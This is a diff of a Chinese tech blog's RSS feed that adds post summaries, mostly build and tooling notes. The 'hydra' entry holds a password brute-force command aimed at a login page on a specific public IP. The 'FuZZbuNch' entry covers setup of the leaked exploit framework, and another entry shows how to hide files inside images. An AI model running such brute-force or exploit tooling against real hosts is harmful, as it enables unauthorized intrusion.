+Linux curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo yum makecache yum update -y timedatectl set-timezone Asia/Shanghai date +%s -s @1602842120 hwclock -w Docker https://docs.docker.com/reference/ https://docs.docker.com/engine/reference/builder/ https://docs.docker.com/engine/reference/commandline/docker/ https://docs.docker.com/engine/reference/commandline/dockerd/ curl -fsSL https://get.docker.com | bash -s -- docker --mirror Aliyun mkdir -p /etc/docker echo -e &amp;#39;{\n&amp;#34;userland-proxy&amp;#34;: false,\n&amp;#34;registry-mirrors&amp;#34;: [&amp;#34;https://docker.mirrors.ustc.edu.cn&amp;#34;]\n}&amp;#39; &amp;gt; /etc/docker/daemon.json systemctl start docker systemctl enable docker systemctl status docker usermod -aG docker leo docker ps -a #查看容器 docker images #查看镜像 docker network ls #查看网络 docker rm -fv gitlab #停止并删除容器、卷 docker rm `docker ps -a -q` #删除已停止的容器 docker rmi gitlab/gitlab-ce #删除镜像 docker image prune -f #清除未使用镜像 docker logs -f gitlab #查看容器日志 docker exec -it gitlab sh #获得容器 Shell docker system info #查看系统信息 docker system df #查看磁盘占用 docker system prune --volumes #清除未使用数据 Docker Compose https://docs.</description>
     </item>
     <item>
       <title>构建 hydra</title>
       <link>https://xhstormr.github.io/blog/posts/msys2-build-hydra/</link>
       <pubDate>Fri, 01 Mar 2019 14:11:28 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/msys2-build-hydra/</guid>
-      <description></description>
+      <description>Updated on 2019-03-01
+MSYS2
+hydra
+Step D:\Work\Download\thc-hydra-master&amp;gt; pacman -Syu pacman -S --noconfirm --needed gcc make openssl-devel ./configure &amp;amp;&amp;amp; make hydra -V -F -L username.txt -P password.txt -o ok.txt -t 20 &amp;#39;http-post-form://222.69.159.53:80/cm_admin/login.aspx:txtloginid=^USER^&amp;amp;txtpsw=^PASS^:F=password incorrect!:H=User-Agent\: wget&amp;#39; pacman -F jq.exe #搜索软件包（By File） pacman -Ss gcc #搜索软件包（By Name） pacman -Sg mingw-w64-x86_64-toolchain mingw-w64-i686-toolchain #查看软件组 echo &amp;#39;Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/$arch/&amp;#39; &amp;gt; /etc/pacman.d/mirrorlist.msys echo &amp;#39;Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/i686/&amp;#39; &amp;gt; /etc/pacman.d/mirrorlist.mingw32 echo &amp;#39;Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/x86_64/&amp;#39; &amp;gt; /etc/pacman.d/mirrorlist.mingw64 pacman -Sy Reference 依赖： msys-2.</description>
     </item>
     <item>
       <title>构建 tcpdump</title>
       <link>https://xhstormr.github.io/blog/posts/cmake-build-tcpdump/</link>
       <pubDate>Sat, 13 Oct 2018 13:47:42 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/cmake-build-tcpdump/</guid>
-      <description></description>
+      <description>Updated on 2018-10-13
+gcc
+cmake
+npcap SDK
+npcap DLL
+tcpdump
+Step D:\Work\Download\tcpdump-master&amp;gt; type nul &amp;gt; PreLoad.cmake echo set(CMAKE_C_STANDARD 11 CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt; PreLoad.cmake echo set(CMAKE_C_STANDARD_REQUIRED ON CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_C_FLAGS &amp;#34;-s -Os&amp;#34; CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_EXE_LINKER_FLAGS &amp;#34;-static&amp;#34; CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo. &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_GENERATOR &amp;#34;MinGW Makefiles&amp;#34; CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_INSTALL_PREFIX &amp;#34;456&amp;#34; CACHE PATH &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.</description>
     </item>
     <item>
       <title>MyBatis Generator</title>
       <link>https://xhstormr.github.io/blog/posts/mybatis-generator/</link>
       <pubDate>Fri, 20 Jul 2018 14:35:35 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/mybatis-generator/</guid>
-      <description></description>
+      <description>Updated on 2018-07-20
+https://github.com/mybatis/generator
+start.bat @ echo off if not exist mybatis-generator-core-1.3.7.jar curl -LROk https://jcenter.bintray.com/org/mybatis/generator/mybatis-generator-core/1.3.7/mybatis-generator-core-1.3.7.jar if not exist postgresql-42.2.4.jar curl -LROk https://jcenter.bintray.com/org/postgresql/postgresql/42.2.4/postgresql-42.2.4.jar md src\main\java md src\main\resources javac -cp mybatis-generator-core-1.3.7.jar; MyCommentGenerator.java javac -cp mybatis-generator-core-1.3.7.jar; MyResultMapGenerator.java java -cp mybatis-generator-core-1.3.7.jar; org.mybatis.generator.api.ShellRunner -configfile generatorConfig.xml -overwrite generatorConfig.xml &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE generatorConfiguration PUBLIC &amp;#34;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&amp;#34; &amp;#34;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&amp;#34;&amp;gt; &amp;lt;generatorConfiguration&amp;gt; &amp;lt;classPathEntry location=&amp;#34;postgresql-42.2.4.jar&amp;#34; /&amp;gt; &amp;lt;context id=&amp;#34;abc&amp;#34; targetRuntime=&amp;#34;MyBatis3DynamicSql&amp;#34;&amp;gt; &amp;lt;property name=&amp;#34;autoDelimitKeywords&amp;#34; value=&amp;#34;true&amp;#34; /&amp;gt; &amp;lt;property name=&amp;#34;javaFileEncoding&amp;#34; value=&amp;#34;UTF-8&amp;#34; /&amp;gt; &amp;lt;plugin type=&amp;#34;MyResultMapGenerator&amp;#34; /&amp;gt; &amp;lt;plugin type=&amp;#34;org.</description>
     </item>
     <item>
       <title>QEMU</title>
       <link>https://xhstormr.github.io/blog/posts/qemu/</link>
       <pubDate>Fri, 20 Apr 2018 10:29:55 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/qemu/</guid>
-      <description></description>
+      <description>Updated on 2018-04-22
+https://wiki.qemu.org/Documentation
+https://qemu.weilnetz.de/doc/qemu-doc.html
+QEMU https://qemu.weilnetz.de/w64/ 创建镜像：qemu-img.exe create -f qcow2 123.qcow2 512M 安装系统：qemu-system-x86_64.exe -hda 123.qcow2 -m 512M -nographic -boot once=d,menu=on -cdrom alpine-virt-3.7.0-x86_64.iso 启动系统：qemu-system-x86_64.exe -hda 123.qcow2 -m 512M -nographic 脱离：Ctrl+Alt+G 全屏：Ctrl+Alt+F TAP https://build.openvpn.net/downloads/releases/tap-windows-9.24.2.zip 安装：tapinstall install OemVista.inf TAP0901 卸载：tapinstall remove TAP0901 重命名 TAP 接口 ---- netsh interface show interface &amp;#34;以太网 2&amp;#34; netsh interface set interface &amp;#34;以太网 2&amp;#34; newname=my_tap netsh interface show interface my_tap https://github.com/OpenVPN/tap-windows6 Linux https://mirrors.tuna.tsinghua.edu.cn/alpine/latest-stable/releases/x86_64/alpine.iso https://mirrors.tuna.tsinghua.edu.cn/tinycorelinux/9.x/x86_64/release/CorePure64.iso Alpine ---- 设置：setup-alpine 安装：apk add curl tree vim 服务：rc-service -l 重启：reboot 关机：poweroff 允许 ROOT 用户密码登录 SSH ---- echo PermitRootLogin yes &amp;gt;&amp;gt; /etc/ssh/sshd_config Windows https://sourceforge.</description>
     </item>
     <item>
       <title>Swagger API</title>
       <link>https://xhstormr.github.io/blog/posts/swagger/</link>
       <pubDate>Fri, 02 Mar 2018 15:55:56 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/swagger/</guid>
-      <description></description>
+      <description>Updated on 2018-03-02
+https://editor.swagger.io/
+https://inspector.swagger.io/
+@ curl -LRko swagger-codegen-cli.jar https://jcenter.bintray.com/io/swagger/swagger-codegen-cli/2.3.1/swagger-codegen-cli-2.3.1.jar @ curl -RkO http://petstore.swagger.io/v2/swagger.json @ java -jar swagger-codegen-cli.jar generate ^ -i swagger.json ^ -o client ^ -l java ^ -DapiPackage=com.example.demo.client.api ^ -DmodelPackage=com.example.demo.client.model ^ -DinvokerPackage=com.example.demo.client ^ -Dlibrary=resttemplate ^ -Djava8=true ^ -DdateLibrary=java8 ^ -DhideGenerationTimestamp=true @ java -jar swagger-codegen-cli.jar generate ^ -i swagger.json ^ -o server ^ -l spring ^ -DapiPackage=com.example.demo.api ^ -DmodelPackage=com.example.demo.model ^ -DinvokerPackage=com.example.demo ^ -DconfigPackage=com.example.demo.config ^ -Dlibrary=spring-boot ^ -Djava8=true ^ -DdateLibrary=java8 ^ -DuseOptional=true ^ -DsingleContentTypes=true ^ -DhideGenerationTimestamp=true :: gradlew init --type pom :: 模板: https://github.</description>
     </item>
     <item>
       <title>构建 libxml2</title>
       <link>https://xhstormr.github.io/blog/posts/build-libxml2/</link>
       <pubDate>Sun, 18 Feb 2018 17:27:36 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/build-libxml2/</guid>
-      <description></description>
+      <description>Updated on 2018-02-18
+gcc
+libxml2
+Step D:\Work\Download\libxml2-mainline\win32&amp;gt; https://github.com/GNOME/libxml2/blob/mainline/win32/Makefile.mingw#L334 XML_BASENAME -&amp;gt; XML_NAME cscript configure.js help cscript configure.js compiler=mingw static=yes xml_debug=no legacy=no iconv=no ftp=no http=no html=no modules=no reader=no writer=no walker=no c14n=no catalog=no docb=no mingw32-make -f Makefile.mingw utils </description>
     </item>
     <item>
       <title>Bandicam Portable</title>
       <link>https://xhstormr.github.io/blog/posts/bandicam-portable/</link>
       <pubDate>Wed, 14 Feb 2018 19:51:46 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/bandicam-portable/</guid>
-      <description></description>
+      <description>Updated on 2018-03-15
+https://sg-dl.bandicam.com/bdcamsetup.exe
+Export export.bat ⇳ @ reg export HKEY_LOCAL_MACHINE\SOFTWARE\BandiMPEG1 1.reg /y @ reg export HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\BandiMPEG1 2.reg /y @ reg export HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\BANDISOFT 3.reg /y @ busybox cat 1.reg 2.reg 3.reg &amp;gt; 4.reg @ iconv -f UTF-16 -t UTF-8 4.reg &amp;gt; 5.reg @ busybox sed -i ^ -e &amp;#34;1 a Windows Registry Editor Version 5.00&amp;#34; ^ -e &amp;#34;/^Windows Registry Editor Version 5.00$/d&amp;#34; ^ -e &amp;#34;s/C:\\\\Program Files (x86)/D:\\\\Download\\\\Bandicam/g&amp;#34; ^ 5.reg @ echo [HKEY_CURRENT_USER\SOFTWARE\BANDISOFT\BANDICAM\OPTION] &amp;gt;&amp;gt; 5.</description>
     </item>
     <item>
       <title>构建 libiconv</title>
       <link>https://xhstormr.github.io/blog/posts/automake-build-libiconv/</link>
       <pubDate>Wed, 14 Feb 2018 13:46:24 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/automake-build-libiconv/</guid>
-      <description></description>
+      <description>Updated on 2018-02-14
+gcc
+libiconv
+Step D:\Work\Download\libiconv&amp;gt; mkdir build ; cd build ../configure --enable-shared=no --enable-static=yes CFLAGS=&amp;#39;-s -static -Os&amp;#39; &amp;amp;&amp;amp; mingw32-make -j4 </description>
     </item>
     <item>
       <title>解决问题的步骤</title>
       <link>https://xhstormr.github.io/blog/posts/solve-problem/</link>
       <pubDate>Mon, 01 Jan 2018 13:55:23 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/solve-problem/</guid>
-      <description></description>
+      <description>Updated on 2018-01-01
+意识问题的 存在 确定问题的 性质 分析问题的 起因 拟定解决的 方案 实施 与评估方案 </description>
     </item>
     <item>
       <title>FuZZbuNch</title>
       <link>https://xhstormr.github.io/blog/posts/fuzzbunch/</link>
       <pubDate>Sun, 17 Dec 2017 19:36:42 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/fuzzbunch/</guid>
-      <description></description>
+      <description>Updated on 2017-12-17
+https://sourceforge.net/projects/pywin32/files/pywin32
+https://www.python.org/ftp/python/2.6.6/python-2.6.6.msi
+https://github.com/fuzzbunch/fuzzbunch/archive/master.zip
+Concept 目标地址：RHOST（Remote Host） 监听地址：LHOST（Listener Host） Step reg import 123.reg pywin32-221.win32-py2.6.exe set PYTHONHOME=D:\Download\python set PATH=%PATH%;%PYTHONHOME% set PYTHONPATH=%PYTHONHOME%\Lib cd fuzzbunch-master md listeningposts python fb.py python start_lp.py 123.reg ⇳ Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\SOFTWARE\Python] [HKEY_CURRENT_USER\SOFTWARE\Python\Pythoncore] [HKEY_CURRENT_USER\SOFTWARE\Python\Pythoncore\2.6] [HKEY_CURRENT_USER\SOFTWARE\Python\Pythoncore\2.6\InstallPath] @=&amp;#34;D:\\Download\\python&amp;#34; [HKEY_CURRENT_USER\SOFTWARE\Python\Pythoncore\2.6\PythonPath] @=&amp;#34;D:\\Download\\python;D:\\Download\\python\\Lib\\;D:\\Download\\python\\DLLs\\&amp;#34; Reference http://bobao.360.cn/learning/detail/3743.html https://danderspritz.com/ https://github.com/nixawk/labs https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell https://github.com/rapid7/metasploit-payloads/blob/master/java/javapayload </description>
     </item>
     <item>
       <title>构建 botan</title>
       <link>https://xhstormr.github.io/blog/posts/make-build-botan/</link>
       <pubDate>Thu, 21 Sep 2017 20:01:46 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/make-build-botan/</guid>
-      <description></description>
+      <description>Updated on 2017-09-21
+gcc
+git
+python
+botan
+Step D:\Work\Download\botan-master&amp;gt; python configure.py --cc=gcc --os=mingw --link-method=copy mingw32-make -j8 botan.exe rng 25 Reference cli </description>
     </item>
     <item>
       <title>构建 jq</title>
       <link>https://xhstormr.github.io/blog/posts/automake-build-jq/</link>
       <pubDate>Fri, 01 Sep 2017 20:21:40 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/automake-build-jq/</guid>
-      <description></description>
+      <description>Updated on 2017-09-01
+gcc
+git
+jq
+Step D:\Work\Download&amp;gt; git clone --depth 1 --recurse-submodules --shallow-submodules -j2 https://github.com/stedolan/jq.git cd jq ; mkdir build ; cd build autoreconf -fi .. ../configure --with-oniguruma=builtin --enable-shared=no --enable-static=yes CFLAGS=&amp;#39;-s -Os&amp;#39; LDFLAGS=&amp;#39;-static&amp;#39; &amp;amp;&amp;amp; make -j4 Reference 依赖： flex：src | bin bison：src | bin 构建： libtool：src | bin make：src | bin automake：src | bin autoconf：src | bin m4：src | bin 使用：https://www.ibm.com/developerworks/cn/linux/1612_chengg_jq/ </description>
     </item>
     <item>
       <title>构建 cmark</title>
       <link>https://xhstormr.github.io/blog/posts/cmake-build-cmark/</link>
       <pubDate>Thu, 31 Aug 2017 14:01:08 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/cmake-build-cmark/</guid>
-      <description></description>
+      <description>Updated on 2017-08-31
+gcc
+cmake
+cmark
+Step D:\Work\Download\cmark-master&amp;gt; type nul &amp;gt; PreLoad.cmake echo set(CMAKE_C_STANDARD 11 CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt; PreLoad.cmake echo set(CMAKE_C_STANDARD_REQUIRED ON CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_C_FLAGS &amp;#34;-s -Os&amp;#34; CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_CXX_FLAGS &amp;#34;-s -Os&amp;#34; CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_EXE_LINKER_FLAGS &amp;#34;-static&amp;#34; CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo. &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_GENERATOR &amp;#34;MinGW Makefiles&amp;#34; CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.</description>
     </item>
     <item>
       <title>将文件伪装成图片</title>
       <link>https://xhstormr.github.io/blog/posts/file-into-picture/</link>
       <pubDate>Wed, 06 Jul 2016 18:06:57 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/file-into-picture/</guid>
-      <description></description>
+      <description>Updated on 2016-07-06
+CMD:
+copy /b a.png + b.7z c.png REG:
+Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\Directory\Background\shell\在此处打开命令窗口] &amp;#34;Icon&amp;#34;=&amp;#34;C:\\Windows\\System32\\cmd.exe&amp;#34; [HKEY_CLASSES_ROOT\Directory\Background\shell\在此处打开命令窗口\command] @=&amp;#34;cmd.exe /s /k pushd \&amp;#34;%V\&amp;#34;&amp;#34; Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\*\shell\用 7z 打开] &amp;#34;Icon&amp;#34;=&amp;#34;D:\\Program Files\\7-Zip\\7zFM.exe&amp;#34; [HKEY_CLASSES_ROOT\*\shell\用 7z 打开\command] @=&amp;#34;\&amp;#34;D:\\Program Files\\7-Zip\\7zFM.exe\&amp;#34; \&amp;#34;%1\&amp;#34;&amp;#34; RES:</description>
     </item>
     <item>
       <title>解包 MSI IS 文件</title>
       <link>https://xhstormr.github.io/blog/posts/unpack-msi-installshield/</link>
       <pubDate>Thu, 11 Feb 2016 20:17:10 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/unpack-msi-installshield/</guid>
-      <description></description>
+      <description>MSI msiexec.exe /a D:\test.msi /passive TARGETDIR=D:\dir InnoSetup test.exe /VERYSILENT /NORESTART /NOICONS /DIR=&amp;quot;D:\dir&amp;quot; InstallShield test.exe /a /s /v&amp;quot;/passive TARGETDIR=D:\dir test.exe /extract_all:D:\dir SourceTree SourceTreeSetup_1.9.10.0.exe /? SourceTreeSetup_1.9.10.0.exe /extract More 7zr, innounp, lessmsi
+Reference MSI, InnoSetup, InstallShield, InstallShield, InstallShield</description>
     </item>
     <item>
       <title>带宽测速</title>
       <link>https://xhstormr.github.io/blog/posts/bandwidth-speed/</link>
       <pubDate>Wed, 10 Feb 2016 14:02:01 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/bandwidth-speed/</guid>
-      <description></description>
+      <description>Updated on 2016-11-26
+http://openspeedtest.com/
+http://speedtest.xfinity.com/
+https://speed.cloudflare.com/
+https://www.speedtest.net/
+https://www.speedcheck.org/
+https://test.ustc.edu.cn/
+1 MB = 1024 KB 1 Mbps = 0.125 MB/S = 128 KB/S </description>
     </item>
     <item>
       <title>Note</title>
       <link>https://xhstormr.github.io/blog/posts/note/</link>
       <pubDate>Mon, 08 Feb 2016 21:08:50 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/note/</guid>
-      <description></description>
+      <description>特殊符号 特殊符号： ·⊙①◎Θ⊙●○¤㊣㈱＠の■□★☆◆◇◣◢◤◥▲△▼▽⊿◢▂▃▄▅▆▇█▉▊▋▌▍▎▏■□〓≡↑↓→←↘↙♀♂┇┅‖$@* amp;#※卍卐∞Ψ§∮№⌒＊◆◇◎●☉ 标点符号： ．。，、；：？！ˉˇ¨`~々～‖∶＂＇｀｜·…—～-〃‘’“”〝〞〔〕〈〉《》「」『』〖〗【】（）［］｛｝︻︼﹄﹃ 数学符号： ＋－×÷﹢﹣±／＝∥∠≌∽≦≧≒﹤﹥≈≡≠＝≤≥＜＞≮≯∷∶∫∮∝∞∧∨∑∏∪∩∈∵∴⊥∥∠⌒⊙√∟⊿㏒㏑％‰ 单位符号： ㎎㎏㎜㎝㎞㎡㏄㏎㏑㏒㏕℡％‰℃℉°′″＄￡￥￠♂♀℅ 数字序号： ①②③④⑤⑥⑦⑧⑨⑩㈠㈡㈢㈣㈤㈥㈦㈧㈨㈩№⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫⅰⅱⅲⅳⅴⅵⅶⅷⅸⅹ 希腊字母： ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩαβγδεζνξοπρσηθικλμτυφχψω 占位符号： 一　一 一&amp;amp;#8195;一 一&amp;amp;#12288;一 https://en.m.wikipedia.org/wiki/Whitespace_character ✔️ ✔ ✖️ ✖ ❌ http://emojipedia.org/heavy-check-mark/ http://emojipedia.org/heavy-multiplication-x/ http://emojipedia.org/cross-mark/ DOTA2 启动： -novid -console -high 控制台： net_graph 1 dota_disable_range_finder 0 纯 UEFI 模式下转换 GPT 格式 1. BIOS 设置中启动项关闭兼容模式 2. 插入 Win8 启动盘后，出现第一个&amp;#34;下一步&amp;#34;，按shift+f10调出命令对话框 3. 输入 diskpart 4. 输入 select disk 0 5. 输入 clean 6. 输入 convert gpt 到这里就可以关闭命令对话框，按下一步进行正常的分区设置了，系统会自动分出三个区用于UEFI的启动。 GPU &amp;amp; CPU 天梯表 http://malu.</description>
     </item>
   </channel>
 </rss>
